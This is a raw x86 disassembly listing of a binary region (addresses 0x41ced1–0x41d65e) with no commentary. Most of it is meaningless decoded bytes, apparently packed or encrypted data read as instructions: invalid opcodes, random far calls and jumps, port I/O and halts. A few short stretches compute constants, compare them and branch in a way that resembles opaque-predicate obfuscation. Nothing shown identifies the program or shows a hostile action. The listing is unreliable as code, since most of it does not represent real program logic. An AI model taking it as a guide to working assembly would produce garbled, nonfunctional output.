  41ced1:	xor    ch,BYTE PTR [esi-0x509c6ffb]
  41ced7:	add    dh,BYTE PTR [ecx]
  41ced9:	je     0x41cecf
  41cedb:	pop    ss
  41cedc:	lods   eax,DWORD PTR ds:[esi]
  41cedd:	sub    eax,0xf99506d8
  41cee2:	dec    ebp
  41cee3:	fcomi  st,st(2)
  41cee5:	xchg   edx,eax
  41cee6:	jno    0x41cf0f
  41cee8:	jmp    0x41cee7
  41ceea:	in     al,dx
  41ceeb:	jl     0x41ceb0
  41ceed:	ror    dl,0xf9
  41cef0:	jbe    0x41cf31
  41cef2:	mov    al,0x7e
  41cef4:	(bad)  
  41cef6:	xchg   edi,eax
  41cef7:	xchg   ecx,eax
  41cef8:	xor    edi,DWORD PTR [ebx]
  41cefa:	adc    DWORD PTR [esi],0x95b7b6e9
  41cf00:	add    eax,0x9493333b
  41cf05:	sbb    al,0x41
  41cf07:	shl    ah,1
  41cf09:	scas   al,BYTE PTR es:[edi]
  41cf0a:	scas   eax,DWORD PTR es:[edi]
  41cf0b:	scas   eax,DWORD PTR es:[edi]
  41cf0c:	ss pop esp
  41cf0e:	xor    DWORD PTR [ebp+0x29],esp
  41cf11:	mov    dh,0xf5
  41cf13:	push   esi
  41cf14:	mov    eax,ds:0xfc63f7bf
  41cf19:	sub    DWORD PTR [ebp+0x21],ecx
  41cf1c:	jle    0x41cf3e
  41cf1e:	adc    edx,DWORD PTR [esi+0x36]
  41cf21:	into   
  41cf22:	pop    ds
  41cf23:	pop    ecx
  41cf24:	aas    
  41cf25:	call   0x3dde:0x87bb78f4
  41cf2c:	adc    DWORD PTR [edi],esp
  41cf2e:	pusha  
  41cf2f:	les    ebp,FWORD PTR [ecx+ebp*1+0x48]
  41cf33:	mov    BYTE PTR [esp+esi*8],0x62
  41cf37:	scas   al,BYTE PTR es:[edi]
  41cf38:	fidivr WORD PTR fs:[edi+edx*4]
  41cf3c:	aad    0xa9
  41cf3e:	inc    ecx
  41cf3f:	rol    BYTE PTR [ecx],cl
  41cf41:	stc    
  41cf42:	shl    al,cl
  41cf44:	xor    BYTE PTR [ebp+0x281ca716],bl
  41cf4a:	lock fiadd DWORD PTR [esi-0x46]
  41cf4e:	int3   
  41cf4f:	lock pop ds
  41cf51:	cmp    ecx,0x140af53f
  41cf57:	mov    ebx,0xaa2489b9
  41cf5c:	dec    esi
  41cf5d:	jp     0x41cfd7
  41cf5f:	mov    ds:0xd42e8856,al
  41cf64:	dec    ecx
  41cf65:	lods   eax,DWORD PTR ds:[esi]
  41cf66:	and    ah,BYTE PTR [edx+0x5b]
  41cf69:	adc    al,0x8
  41cf6b:	sbb    bh,BYTE PTR [esi+0x1c3f9a2f]
  41cf71:	sbb    DWORD PTR [eax+0x24],edi
  41cf74:	fdivr  QWORD PTR [ecx-0x3f]
  41cf77:	cmc    
  41cf78:	call   0x3599:0xb6c0284
  41cf7f:	jne    0x41cf97
  41cf81:	pushf  
  41cf82:	repnz push esi
  41cf84:	js     0x41cf6f
  41cf86:	(bad)  
  41cf87:	nop
  41cf88:	and    al,dh
  41cf8a:	pop    es
  41cf8b:	fcomi  st,st(3)
  41cf8d:	or     al,0x95
  41cf8f:	push   ebp
  41cf90:	mov    al,ds:0x35c646
  41cf95:	push   cs
  41cf96:	or     eax,0x20b094e
  41cf9b:	not    BYTE PTR [eax+0x58]
  41cf9e:	imul   edx,edx,0x1e
  41cfa1:	pop    edi
  41cfa2:	and    DWORD PTR [eax-0x3e],ebx
  41cfa5:	or     BYTE PTR [esp+eax*2+0x130714aa],al
  41cfac:	jg     0x41d01b
  41cfae:	or     al,0x47
  41cfb0:	push   ss
  41cfb1:	stos   DWORD PTR es:[edi],eax
  41cfb2:	(bad)  
  41cfb3:	sub    DWORD PTR [edx+0x67],esp
  41cfb6:	xor    ebx,DWORD PTR [eax]
  41cfb8:	mov    dl,0x5a
  41cfba:	mov    ah,0xe8
  41cfbc:	dec    ebx
  41cfbd:	retf   0x417b
  41cfc0:	and    ebp,DWORD PTR [esp+ebx*4+0x31]
  41cfc4:	out    0xda,eax
  41cfc6:	ds stos BYTE PTR es:[edi],al
  41cfc8:	sbb    al,BYTE PTR [edi+0x30d2a0fb]
  41cfce:	mov    ss,esp
  41cfd0:	ret    
  41cfd1:	aam    0x76
  41cfd3:	stos   DWORD PTR es:[edi],eax
  41cfd4:	mov    esi,0xfbafb802
  41cfd9:	test   DWORD PTR [ecx+0x11],ebx
  41cfdc:	push   ds
  41cfdd:	das    
  41cfde:	pop    ebx
  41cfdf:	adc    BYTE PTR [eax],ch
  41cfe1:	cwde   
  41cfe2:	push   cs
  41cfe3:	pop    ebx
  41cfe4:	fwait
  41cfe5:	cs addr16 xor dl,bh
  41cfe9:	hlt    
  41cfea:	add    al,0xf6
  41cfec:	repz and bh,al
  41cfef:	in     eax,0x23
  41cff1:	sar    BYTE PTR [ebx-0x88519bd],cl
  41cff7:	xor    DWORD PTR [ebp+0x17],0x48f24ec
  41cffe:	mov    BYTE PTR [edx+0x65cfc624],bh
  41d004:	xor    bh,BYTE PTR [ebx-0x2372c6c3]
  41d00a:	xor    esi,edi
  41d00c:	mov    DWORD PTR [edi+edx*4+0x17],esi
  41d010:	repnz ds push ds
  41d013:	leave  
  41d014:	xor    al,0x60
  41d016:	out    0x44,al
  41d018:	sbb    DWORD PTR [esi+esi*4-0x24],eax
  41d01c:	jmp    0x41cfe9
  41d01e:	adc    BYTE PTR [eax+eiz*2+0x52ddda10],ch
  41d025:	push   ebp
  41d026:	mov    edi,0x28647225
  41d02b:	hlt    
  41d02c:	jl     0x41cfaf
  41d02e:	lahf   
  41d02f:	inc    edx
  41d030:	inc    eax
  41d031:	pop    ecx
  41d032:	cmp    al,0xa8
  41d034:	xchg   esp,eax
  41d035:	push   es
  41d036:	std    
  41d037:	pushf  
  41d038:	fcomp  QWORD PTR [ecx+0x75]
  41d03b:	dec    esp
  41d03c:	rol    DWORD PTR [eax],1
  41d03e:	jnp    0x41d090
  41d040:	stos   DWORD PTR es:[edi],eax
  41d041:	lods   eax,DWORD PTR ds:[esi]
  41d042:	push   esi
  41d043:	mov    edi,0xacf8ee40
  41d048:	stos   DWORD PTR es:[edi],eax
  41d049:	jmp    0x41d023
  41d04b:	rcr    DWORD PTR [ebx+esi*8],1
  41d04e:	ret    0xfacd
  41d051:	push   ss
  41d052:	scas   al,BYTE PTR es:[edi]
  41d053:	int    0x81
  41d055:	push   ebp
  41d056:	jge    0x41d0d2
  41d058:	loope  0x41d098
  41d05a:	push   cs
  41d05b:	xor    BYTE PTR [ecx],bh
  41d05d:	outs   dx,BYTE PTR ds:[esi]
  41d05e:	mov    dl,0xdb
  41d060:	popa   
  41d061:	mov    ebp,0xaaf432a6
  41d066:	xor    edi,DWORD PTR [ebp+0x48]
  41d069:	or     edi,DWORD PTR [edx-0x1a]
  41d06c:	push   esi
  41d06d:	inc    eax
  41d06e:	cwde   
  41d06f:	sub    BYTE PTR [edi-0x36],bh
  41d072:	mov    edi,0x92f6cf97
  41d077:	sub    DWORD PTR [edx-0x756a03c],ecx
  41d07d:	(bad)  [esi-0x2a]
  41d080:	and    edi,DWORD PTR [esi+0x5103142a]
  41d086:	pop    eax
  41d087:	xor    eax,0x770b35fd
  41d08c:	add    bh,BYTE PTR [ebx+ecx*2]
  41d08f:	mov    dh,0x77
  41d091:	jle    0x41d0bb
  41d093:	mov    bl,0x4a
  41d095:	arpl   WORD PTR [edx-0x2bf5cb6c],ax
  41d09b:	push   0x53
  41d09d:	inc    DWORD PTR [ebx-0x48]
  41d0a0:	call   0x2ffc7a8e
  41d0a5:	cmp    cl,ah
  41d0a7:	faddp  st(0),st
  41d0a9:	mov    eax,ds:0x48a6955a
  41d0ae:	popf   
  41d0af:	das    
  41d0b0:	xor    bh,bh
  41d0b2:	cmp    dh,0x2f
  41d0b5:	or     edx,DWORD PTR [esi-0x36]
  41d0b8:	dec    al
  41d0ba:	outs   dx,DWORD PTR ds:[esi]
  41d0bb:	push   cs
  41d0bc:	hlt    
  41d0bd:	xchg   ebp,eax
  41d0be:	imul   ebp,DWORD PTR ds:0x1801d834,0x37
  41d0c5:	aaa    
  41d0c6:	mov    WORD PTR [eax],cs
  41d0c8:	int    0x31
  41d0ca:	mov    cl,0xe2
  41d0cc:	pop    esi
  41d0cd:	dec    ebx
  41d0ce:	sub    al,cl
  41d0d0:	mov    cl,BYTE PTR [esp+0x38]
  41d0d4:	sub    al,0x56
  41d0d6:	movzx  eax,al
  41d0d9:	movzx  ecx,cl
  41d0dc:	cdq    
  41d0dd:	idiv   ecx
  41d0df:	movzx  ecx,BYTE PTR [esp+0x2c]
  41d0e4:	or     eax,ecx
  41d0e6:	mov    BYTE PTR [esp+0xc],al
  41d0ea:	mov    BYTE PTR [esp+0x24],0x1
  41d0ef:	mov    BYTE PTR [esp+0x2b],0xcf
  41d0f4:	mov    BYTE PTR [esp+0x3c],0x6
  41d0f9:	mov    BYTE PTR [esp+0x38],0x25
  41d0fe:	mov    BYTE PTR [esp+0x2c],0xf8
  41d103:	mov    al,BYTE PTR [esp+0x2c]
  41d107:	mov    cl,BYTE PTR [esp+0x38]
  41d10b:	or     al,0xc4
  41d10d:	and    al,cl
  41d10f:	mov    cl,BYTE PTR [esp+0x3c]
  41d113:	imul   cl
  41d115:	mov    cl,BYTE PTR [esp+0x2b]
  41d119:	movzx  ecx,cl
  41d11c:	movzx  eax,al
  41d11f:	and    eax,ecx
  41d121:	mov    cl,BYTE PTR [esp+0x24]
  41d125:	movzx  ecx,cl
  41d128:	cdq    
  41d129:	idiv   ecx
  41d12b:	mov    cl,BYTE PTR [esp+0xc]
  41d12f:	cmp    cl,al
  41d131:	je     0x41d926
  41d137:	lea    eax,[esp+0x9c]
  41d13e:	push   eax
  41d13f:	lea    edi,[esp+0x80]
  41d146:	call   0x40f356
  41d14b:	cmp    eax,ebx
  41d14d:	jmp    0x41d51c
  41d152:	lahf   
  41d153:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d154:	out    dx,eax
  41d155:	cdq    
  41d156:	out    dx,eax
  41d157:	inc    ecx
  41d158:	push   ds
  41d159:	push   ds
  41d15a:	mov    eax,0xa2bc6585
  41d15f:	xchg   ebx,eax
  41d160:	sbb    BYTE PTR [edx+0x18165d36],ch
  41d166:	mov    esp,0x99181812
  41d16b:	stc    
  41d16c:	or     ch,BYTE PTR [ecx]
  41d16e:	js     0x41d14a
  41d170:	imul   eax,DWORD PTR [ebx+eiz*8-0x75],0xffffffb5
  41d175:	sub    edi,esp
  41d177:	ins    BYTE PTR es:[edi],dx
  41d178:	cmp    DWORD PTR [edi+0x41],eax
  41d17b:	imul   eax,DWORD PTR [esp+ecx*8],0xffffffe3
  41d17f:	scas   eax,DWORD PTR es:[edi]
  41d180:	and    ebp,eax
  41d182:	mov    eax,ds:0x7a659e79
  41d187:	mov    ecx,0xffd5569c
  41d18c:	int    0xd5
  41d18e:	mov    eax,esp
  41d190:	in     eax,dx
  41d191:	mov    edi,0x6df53572
  41d196:	mov    al,ds:0x5161c523
  41d19b:	or     BYTE PTR [esi],dh
  41d19d:	jno    0x41d1df
  41d19f:	cmp    al,BYTE PTR [edi+0x7e]
  41d1a2:	adc    BYTE PTR [esi],dh
  41d1a4:	dec    eax
  41d1a5:	jp     0x41d185
  41d1a7:	sahf   
  41d1a8:	fdivr  st(0),st
  41d1aa:	aaa    
  41d1ab:	inc    edi
  41d1ac:	les    esp,FWORD PTR [ebx]
  41d1ae:	mov    ebx,0xa74d37dd
  41d1b3:	dec    esi
  41d1b4:	jae    0x41d1c4
  41d1b6:	test   BYTE PTR [ebx+eax*1],bl
  41d1b9:	leave  
  41d1ba:	or     BYTE PTR [ebx],dl
  41d1bc:	(bad)  
  41d1be:	inc    ecx
  41d1bf:	inc    ecx
  41d1c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d1c1:	sub    al,0x6c
  41d1c3:	enter  0xcf89,0x29
  41d1c7:	retf   
  41d1c8:	mov    cl,0x7d
  41d1ca:	mov    ch,bl
  41d1cc:	mov    ?,WORD PTR [ebx]
  41d1ce:	mov    edi,0xbae8c08e
  41d1d3:	cwde   
  41d1d4:	cmc    
  41d1d5:	add    eax,0x9ae1e803
  41d1da:	mov    eax,DWORD PTR [edx]
  41d1dc:	(bad)  
  41d1dd:	stc    
  41d1de:	iret   
  41d1df:	xor    al,0xb2
  41d1e1:	nop
  41d1e2:	xlat   BYTE PTR ds:[ebx]
  41d1e3:	dec    edi
  41d1e4:	xchg   esi,eax
  41d1e5:	sbb    DWORD PTR [edi-0x30f26875],esp
  41d1eb:	mov    ds:0xc600ddf5,al
  41d1f0:	int    0xb8
  41d1f2:	inc    ebx
  41d1f3:	xchg   ebx,eax
  41d1f4:	xchg   esp,eax
  41d1f5:	call   DWORD PTR [ecx+0x61]
  41d1f8:	pop    esi
  41d1f9:	imul   esp,edx,0xffffff80
  41d1fc:	mov    eax,ds:0x59d5c1a
  41d201:	retf   0xa024
  41d204:	addr16 cld 
  41d206:	xor    eax,0xa2e70644
  41d20b:	ret    0x213c
  41d20e:	pop    ecx
  41d20f:	mov    ch,0xf8
  41d211:	xor    BYTE PTR [esi+0x2d148787],bl
  41d217:	popf   
  41d218:	dec    edx
  41d219:	aad    0xa6
  41d21b:	pusha  
  41d21c:	push   ebp
  41d21d:	stos   BYTE PTR es:[edi],al
  41d21e:	ja     0x41d1df
  41d220:	dec    esp
  41d221:	push   edx
  41d222:	dec    ecx
  41d223:	push   0x76d64829
  41d228:	sbb    al,0x59
  41d22a:	sbb    al,0xb1
  41d22c:	add    esi,DWORD PTR [eax+esi*2-0x72]
  41d230:	rcl    al,0x92
  41d233:	or     DWORD PTR [esi-0x1b],0xbe410f89
  41d23a:	test   al,0x29
  41d23c:	out    0xe4,eax
  41d23e:	test   DWORD PTR [edi],esi
  41d240:	imul   ecx,edi,0xc4946c2f
  41d246:	bound  edi,QWORD PTR [ecx+0x464d6642]
  41d24c:	cmp    cl,BYTE PTR [edx+0x3b32eeb4]
  41d252:	pop    ecx
  41d253:	fisttp DWORD PTR [esi+0x78bf640]
  41d259:	ss hlt 
  41d25b:	aas    
  41d25c:	fs mov dl,0x5b
  41d25f:	ficom  DWORD PTR [esi]
  41d261:	cmp    al,0x9c
  41d263:	sub    BYTE PTR [esi-0x39],ah
  41d266:	outs   dx,DWORD PTR ds:[esi]
  41d267:	cmp    bl,0x59
  41d26a:	call   0x3e92:0xc57099cb
  41d271:	fnstcw WORD PTR [esi]
  41d273:	sub    DWORD PTR [esi+0x29],esp
  41d276:	mov    bh,0xe2
  41d278:	(bad)  
  41d279:	push   ebx
  41d27a:	cmp    eax,0x6c710898
  41d27f:	cwde   
  41d280:	lahf   
  41d281:	aaa    
  41d282:	aad    0xdc
  41d284:	adc    eax,0x5d6ff824
  41d289:	rcl    DWORD PTR [edx],1
  41d28b:	mov    fs:0x541308dc,al
  41d291:	out    0xc2,eax
  41d293:	jle    0x41d274
  41d295:	add    bl,cl
  41d297:	idiv   esp
  41d299:	xor    ah,BYTE PTR [ebx-0x66]
  41d29c:	xor    al,0xd2
  41d29e:	mov    ?,WORD PTR ds:0x2f88fed6
  41d2a4:	loop   0x41d2bc
  41d2a6:	(bad)  
  41d2a7:	stc    
  41d2a8:	mov    ebx,0x1f04f79a
  41d2ad:	pop    esp
  41d2ae:	dec    edi
  41d2af:	test   DWORD PTR [eax+0x31b93634],0xb7ff4220
  41d2b9:	in     eax,0x20
  41d2bb:	xchg   edi,eax
  41d2bc:	(bad)  
  41d2bd:	into   
  41d2be:	mov    eax,0x18b7099c
  41d2c3:	call   0x19f5:0xd9769135
  41d2ca:	mov    dh,0x33
  41d2cc:	les    edx,FWORD PTR [eax-0x2e72ee96]
  41d2d2:	fstp   st(2)
  41d2d4:	test   al,0xbe
  41d2d6:	jno    0x41d308
  41d2d8:	test   al,0x4d
  41d2da:	pop    edi
  41d2db:	and    DWORD PTR ds:0x5540511f,0x331a6da4
  41d2e5:	call   0xdff3:0xf5a5b16c
  41d2ec:	test   eax,0x1e4f028f
  41d2f1:	xor    cl,BYTE PTR [ecx]
  41d2f3:	mov    cl,0xda
  41d2f5:	mov    BYTE PTR [ebx+0x4f7bdd2a],bl
  41d2fb:	inc    esi
  41d2fc:	push   edx
  41d2fd:	push   cs
  41d2fe:	cli    
  41d2ff:	out    0xd6,eax
  41d301:	fdiv   st,st(4)
  41d303:	cmp    al,dh
  41d305:	retf   
  41d306:	add    BYTE PTR [edx-0x29],dl
  41d309:	das    
  41d30a:	jmp    0x1316b40e
  41d30f:	shl    DWORD PTR [ecx+0xba7ea17],1
  41d315:	ss and ebp,esi
  41d318:	push   esp
  41d319:	lea    ecx,[ebx-0x4d]
  41d31c:	adc    BYTE PTR [esp+edx*8+0x5f],bl
  41d320:	pop    ds
  41d321:	loop   0x41d398
  41d323:	(bad)  
  41d324:	(bad)  
  41d325:	loopne 0x41d2ff
  41d327:	mov    ch,0xc2
  41d329:	outs   dx,DWORD PTR ds:[esi]
  41d32a:	fs fsubr QWORD PTR cs:[edi+eiz*4]
  41d32f:	mov    edi,0x492f55e6
  41d334:	and    esi,DWORD PTR [ebp-0x29bfac82]
  41d33a:	jb     0x41d3b1
  41d33c:	add    eax,0x7795c692
  41d341:	pushf  
  41d342:	retf   0x7e81
  41d345:	pop    es
  41d346:	hlt    
  41d347:	mov    ecx,0x567df7aa
  41d34c:	test   BYTE PTR [eax],ah
  41d34e:	sbb    eax,0xc68f6f44
  41d353:	mov    ah,0x2e
  41d355:	inc    eax
  41d356:	sub    al,0x17
  41d358:	dec    ecx
  41d359:	mov    WORD PTR [edx-0x23],gs
  41d35c:	jnp    0x41d312
  41d35e:	add    ebp,DWORD PTR [eax-0xb98c2b1]
  41d364:	mov    ebx,0x9ccc31d5
  41d369:	and    DWORD PTR [edx],esp
  41d36b:	inc    ecx
  41d36c:	scas   eax,DWORD PTR es:[edi]
  41d36d:	xor    al,0x38
  41d36f:	push   cs
  41d370:	mov    eax,0x16f5c1a6
  41d375:	push   DWORD PTR [ebp+0xe]
  41d378:	mov    ch,0x9a
  41d37a:	mov    dh,0x16
  41d37c:	cmp    DWORD PTR [ebx+0x6cc784ed],esp
  41d382:	mov    eax,DWORD PTR [edi+ebx*4]
  41d385:	stos   BYTE PTR es:[edi],al
  41d386:	jle    0x41d308
  41d388:	rol    dh,1
  41d38a:	call   0xf847:0x8bb4483e
  41d391:	mov    edx,0x1fd76daf
  41d396:	dec    eax
  41d397:	adc    dh,BYTE PTR [edx+0x45]
  41d39a:	loop   0x41d3b4
  41d39c:	jl     0x41d35b
  41d39e:	rcr    dl,cl
  41d3a0:	sbb    eax,DWORD PTR [ecx]
  41d3a2:	or     DWORD PTR [ebp-0x339cf61],0x6cac98d9
  41d3ac:	push   0xf7894ad8
  41d3b1:	pop    esi
  41d3b2:	cmp    BYTE PTR [esi+ebp*2-0x1e],dh
  41d3b6:	xor    al,0x48
  41d3b8:	xchg   esi,eax
  41d3b9:	fmul   DWORD PTR [ecx-0x79]
  41d3bc:	lock sahf 
  41d3be:	mov    al,ds:0x2c075039
  41d3c3:	(bad)  
  41d3c4:	sbb    BYTE PTR [ebp+0x14],al
  41d3c7:	shl    BYTE PTR cs:[eax-0x5f535527],0xf4
  41d3cf:	js     0x41d366
  41d3d1:	test   eax,0x9e06cca2
  41d3d6:	dec    esp
  41d3d7:	mov    DWORD PTR [ebp+0x16],ebp
  41d3da:	and    al,0x12
  41d3dc:	jecxz  0x41d3fd
  41d3de:	cmp    esp,DWORD PTR [edi-0x1f]
  41d3e1:	push   cs
  41d3e2:	inc    edi
  41d3e3:	lods   al,BYTE PTR ds:[esi]
  41d3e4:	lahf   
  41d3e5:	out    0x46,eax
  41d3e7:	mov    esi,0xc8c0a3e9
  41d3ec:	outs   dx,DWORD PTR ds:[esi]
  41d3ed:	pop    esi
  41d3ee:	push   edx
  41d3ef:	adc    al,0xb6
  41d3f1:	in     eax,0x57
  41d3f3:	icebp  
  41d3f4:	adc    ch,BYTE PTR [ecx]
  41d3f6:	pop    esi
  41d3f7:	mov    bh,0xa3
  41d3f9:	push   es
  41d3fa:	pop    ds
  41d3fb:	sar    DWORD PTR [edi],1
  41d3fd:	por    mm4,QWORD PTR [edi]
  41d400:	stos   BYTE PTR es:[edi],al
  41d401:	push   ds
  41d402:	jmp    0xa1bd:0x555c6283
  41d409:	mov    ds:0x18b4dbee,al
  41d40e:	push   ebx
  41d40f:	or     ah,al
  41d411:	add    edx,DWORD PTR [eax+0x6765a361]
  41d417:	add    eax,0x8d28b154
  41d41c:	push   ebp
  41d41d:	and    DWORD PTR [ecx-0x2c1974f6],ebx
  41d423:	jg     0x41d3e0
  41d425:	cmp    ch,dh
  41d427:	int    0x23
  41d429:	out    dx,al
  41d42a:	rcl    BYTE PTR [ebx+ecx*8+0x2c],0x6d
  41d42f:	ret    
  41d430:	pop    edx
  41d431:	pop    esi
  41d432:	call   0x53aa:0xd2b18168
  41d439:	imul   ebp,esp,0x2c
  41d43c:	pop    ecx
  41d43d:	scas   eax,DWORD PTR es:[edi]
  41d43e:	jno    0x41d48f
  41d440:	dec    edi
  41d441:	sbb    esi,DWORD PTR [ebx]
  41d443:	xor    al,0x95
  41d445:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d446:	daa    
  41d447:	xor    al,0x1d
  41d449:	xchg   ebp,eax
  41d44a:	mov    esi,0x97875cc
  41d44f:	and    ebp,0x41871685
  41d455:	sahf   
  41d456:	(bad)  
  41d457:	sbb    edx,DWORD PTR [ebp-0x1e3bb978]
  41d45d:	mov    al,0xcc
  41d45f:	or     cl,al
  41d461:	jmp    0xff8e:0x22dd0dae
  41d468:	pop    ecx
  41d469:	jmp    0xa444:0x776c28bb
  41d470:	test   eax,0xb6302f0e
  41d475:	jb     0x41d411
  41d477:	sbb    BYTE PTR [eax-0x20],dh
  41d47a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d47b:	aam    0x6e
  41d47d:	mov    ch,0xfc
  41d47f:	add    BYTE PTR [ebp-0x6a],0x2c
  41d483:	xor    al,0x38
  41d485:	pop    ds
  41d486:	lods   eax,DWORD PTR ds:[esi]
  41d487:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d488:	cs and cl,bh
  41d48b:	imul   esp,DWORD PTR [edi],0xcb58856e
  41d491:	(bad)  
  41d492:	dec    DWORD PTR [edx-0x3e]
  41d495:	out    dx,eax
  41d496:	add    bh,BYTE PTR [ebp-0x5d322894]
  41d49c:	jns    0x41d4ca
  41d49e:	dec    ecx
  41d49f:	test   DWORD PTR ds:0x1e92b459,esi
  41d4a5:	fs ss js 0x41d4c3
  41d4a9:	sbb    dh,dl
  41d4ab:	xchg   ebx,eax
  41d4ac:	dec    esi
  41d4ad:	pop    ebx
  41d4ae:	sbb    al,0x3b
  41d4b0:	pop    ss
  41d4b1:	idiv   BYTE PTR [edx]
  41d4b3:	scas   eax,DWORD PTR es:[edi]
  41d4b4:	ins    BYTE PTR es:[edi],dx
  41d4b5:	(bad)  
  41d4b6:	adc    al,0xbd
  41d4b8:	adc    BYTE PTR [edi+edx*1+0x1f3cdc05],al
  41d4bf:	add    ebp,edi
  41d4c1:	sahf   
  41d4c2:	inc    ecx
  41d4c3:	push   eax
  41d4c4:	retf   0xf3c
  41d4c7:	ret    0xaaae
  41d4ca:	outs   dx,BYTE PTR ds:[esi]
  41d4cb:	cbw    
  41d4cd:	pop    esp
  41d4ce:	sbb    bl,BYTE PTR [edi-0x10]
  41d4d1:	and    cl,BYTE PTR ds:0x8c4f101a
  41d4d7:	imul   eax,DWORD PTR fs:[ebp+0x72],0xffffff89
  41d4dc:	popf   
  41d4dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d4de:	loop   0x41d4ef
  41d4e0:	and    al,0xdb
  41d4e2:	push   esp
  41d4e3:	sbb    eax,0x70a8e2c6
  41d4e8:	or     BYTE PTR [edi-0x1],0xe3
  41d4ec:	hlt    
  41d4ed:	(bad)  
  41d4ee:	sbb    ebp,ecx
  41d4f0:	sti    
  41d4f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d4f2:	pop    es
  41d4f3:	or     al,0xbd
  41d4f5:	pushf  
  41d4f6:	jmp    0xe410:0xbfc0a3e5
  41d4fd:	cmp    BYTE PTR [ebx-0x6ca602f1],cl
  41d503:	outs   dx,DWORD PTR ds:[esi]
  41d504:	js     0x41d55b
  41d506:	sar    dh,0x66
  41d509:	das    
  41d50a:	shr    BYTE PTR [edx],cl
  41d50c:	sub    bh,BYTE PTR [esi-0x74a75bef]
  41d512:	mov    esp,0x4bd45de1
  41d517:	mov    gs:0xf70de68,al
  41d51d:	test   DWORD PTR [esp+eax*1],eax
  41d520:	add    BYTE PTR [eax],al
  41d522:	cmp    edx,esi
  41d524:	jne    0x41d926
  41d52a:	xor    eax,eax
  41d52c:	jmp    0x41e9f0
  41d531:	mov    eax,DWORD PTR [esp+0x70]
  41d535:	mov    ecx,DWORD PTR [esp+0x74]
  41d539:	jmp    0x41d908
  41d53e:	ss lahf 
  41d540:	xchg   ebp,eax
  41d541:	sbb    al,0x7c
  41d543:	sbb    bl,BYTE PTR [esi]
  41d545:	fwait
  41d546:	push   ebx
  41d547:	out    0xc5,eax
  41d549:	jl     0x41d4cd
  41d54b:	ds mov ch,0x7c
  41d54e:	ficom  DWORD PTR [ebp+0x16]
  41d551:	sbb    BYTE PTR [edx+edx*1-0x38e8e7e8],bh
  41d558:	jle    0x41d53a
  41d55a:	jl     0x52928717
  41d560:	shl    BYTE PTR ds:0x2116a431,1
  41d566:	lahf   
  41d567:	mul    edx
  41d569:	dec    eax
  41d56a:	lea    ebp,[eax+0x4a]
  41d56d:	cmc    
  41d56e:	xchg   BYTE PTR [esp+eiz*4-0x68051697],cl
  41d575:	add    DWORD PTR [ebx+0x4d32870d],ebp
  41d57b:	(bad)  
  41d57c:	iret   
  41d57d:	add    al,BYTE PTR [eax-0x52]
  41d580:	aaa    
  41d581:	ror    DWORD PTR [ecx+0x5e4438],cl
  41d587:	xlat   BYTE PTR ds:[ebx]
  41d588:	in     al,dx
  41d589:	mov    ds:0xcfb583ec,eax
  41d58e:	adc    eax,0x1ce88256
  41d593:	test   eax,0x15c69759
  41d598:	add    dh,BYTE PTR [edi]
  41d59a:	fdiv   DWORD PTR [esi+0x6a]
  41d59d:	sbb    ecx,DWORD PTR [ebx+0xe9626b0]
  41d5a3:	out    dx,eax
  41d5a4:	mov    ecx,0x4b42cb2a
  41d5a9:	aaa    
  41d5aa:	cli    
  41d5ab:	push   edi
  41d5ac:	inc    esp
  41d5ad:	int3   
  41d5ae:	fwait
  41d5af:	inc    ebx
  41d5b0:	aas    
  41d5b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d5b2:	mov    bl,0xad
  41d5b4:	dec    edi
  41d5b5:	retf   0x5604
  41d5b8:	inc    ecx
  41d5b9:	xor    BYTE PTR [edx+ecx*8],bh
  41d5bc:	into   
  41d5bd:	xchg   BYTE PTR [edx],ah
  41d5bf:	xor    al,0x38
  41d5c1:	pusha  
  41d5c2:	sbb    al,0xe
  41d5c4:	pop    ecx
  41d5c5:	pop    esi
  41d5c6:	mov    ds:0x4401174b,eax
  41d5cb:	(bad)  
  41d5cc:	jg     0x41d55d
  41d5ce:	xor    edi,DWORD PTR [esi+0x1b]
  41d5d1:	mov    bh,0xc7
  41d5d3:	jbe    0x41d5ce
  41d5d5:	mov    ds:0x2f451a43,al
  41d5da:	mov    esi,DWORD PTR [ebx+0x4710c1f5]
  41d5e0:	iret   
  41d5e1:	push   ecx
  41d5e2:	ins    BYTE PTR es:[edi],dx
  41d5e3:	stos   BYTE PTR es:[edi],al
  41d5e4:	mov    BYTE PTR [ecx-0x6c9b5e36],dh
  41d5ea:	push   es
  41d5eb:	and    BYTE PTR [edi-0x43d6c21c],bh
  41d5f1:	jbe    0x41d639
  41d5f3:	add    eax,0x4adb2b02
  41d5f8:	outs   dx,BYTE PTR ds:[esi]
  41d5f9:	sub    esp,ebp
  41d5fb:	cmp    eax,DWORD PTR [ebx-0x39]
  41d5fe:	stos   DWORD PTR es:[edi],eax
  41d5ff:	test   eax,0x5484f6a1
  41d604:	mov    BYTE PTR [ebx+0x3b],al
  41d607:	fmul   st(4),st
  41d609:	xor    DWORD PTR [ecx+0x1ed6c8be],0xf6d20bf5
  41d613:	push   ds
  41d614:	js     0x41d5c6
  41d616:	fcmovne st,st(5)
  41d618:	lods   al,BYTE PTR ds:[esi]
  41d619:	mov    ebp,0x878c3dc8
  41d61e:	iret   
  41d61f:	stos   BYTE PTR es:[edi],al
  41d620:	mov    cl,0xd1
  41d622:	mov    cl,0x80
  41d624:	(bad)  
  41d625:	pushf  
  41d626:	jp     0x41d5df
  41d628:	shl    cl,1
  41d62a:	adc    DWORD PTR [ebp+eax*2-0x68],0xffffffb6
  41d62f:	mov    dh,al
  41d631:	loop   0x41d63d
  41d633:	mov    dl,0xdc
  41d635:	xchg   ecx,eax
  41d636:	lods   al,BYTE PTR ds:[esi]
  41d637:	push   es
  41d638:	add    ecx,0xffffff93
  41d63b:	jle    0x41d5df
  41d63d:	and    ebp,DWORD PTR ds:0xc1201f52
  41d643:	lods   al,BYTE PTR ds:[esi]
  41d644:	and    dh,ah
  41d646:	pop    ebx
  41d647:	xor    DWORD PTR [ecx-0x752d21de],ebp
  41d64d:	fldln2 
  41d64f:	push   0xffffffeb
  41d651:	add    BYTE PTR [eax+0x1b60e38b],cl
  41d657:	or     eax,DWORD PTR [edi]
  41d659:	cmp    eax,0xd5c2420c
  41d65e:	dec    esp
